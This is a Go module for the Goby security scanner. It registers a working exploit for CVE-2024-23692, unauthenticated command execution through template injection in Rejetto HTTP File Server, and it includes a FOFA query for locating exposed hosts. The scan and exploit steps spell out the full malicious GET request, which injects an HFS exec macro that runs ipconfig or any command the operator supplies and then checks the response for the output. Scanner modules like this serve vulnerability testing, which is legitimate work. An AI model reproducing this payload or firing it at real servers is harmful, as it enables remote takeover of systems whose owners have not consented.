package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "CVE-2024-23692",
  "Description": "<p>HTTP File Server（简称HFS）是一种基于HTTP协议的文件服务系统<br></p>",
  "Product": "HTTP File Server",
  "Homepage": "http://www.rejetto.com/hfs/",
  "DisclosureDate": "2024-05-31",
  "PostTime": "2024-08-21",
  "Author": "zsc",
  "FofaQuery": "app=\"hfs\"",
  "GobyQuery": "app=\"hfs\"",
  "Level": "2",
  "Impact": "<p>该漏洞源于存在模板注入漏洞，允许远程未经身份验证的攻击者通过发送特制的HTTP请求在受影响的系统上执行任意命令。<br></p>",
  "Recommendation": "<p>更新至最新版本 HFS 文件管理器 3.x。<br></p>",
  "References": [],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "ipconfig"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/?n=%0A&cmd=ipconfig&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "RESULT:",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/?n=%0A&cmd={{{cmd}}}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "RESULT:",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [
    "命令执行"
  ],
  "VulType": [
    "命令执行"
  ],
  "CVEIDs": [
    "CVE-2024-23692"
  ],
  "CNNVD": [
    "CNNVD-202405-5001"
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "CVE-2024-23692",
      "Product": "HTTP File Server",
      "Description": "<p>HTTP File Server（简称HFS）是一种基于HTTP协议的文件服务系统<br></p>",
      "Recommendation": "<p>更新至最新版本 HFS 文件管理器 3.x。<br></p>",
      "Impact": "<p>该漏洞源于存在模板注入漏洞，允许远程未经身份验证的攻击者通过发送特制的HTTP请求在受影响的系统上执行任意命令。<br></p>",
      "VulType": [
        "命令执行"
      ],
      "Tags": [
        "命令执行"
      ]
    },
    "EN": {
      "Name": "CVE-2024-23692",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [
        "Command Execution"
      ],
      "Tags": [
        "Command Execution"
      ]
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Variables": {
    "User-Agent": "||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept-Language": "||en-US,en;q=0.5",
    "Accept-Encoding": "||gzip, deflate, br",
    "Connection": "||close",
    "Upgrade-Insecure-Requests": "||1",
    "Accept": "||text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}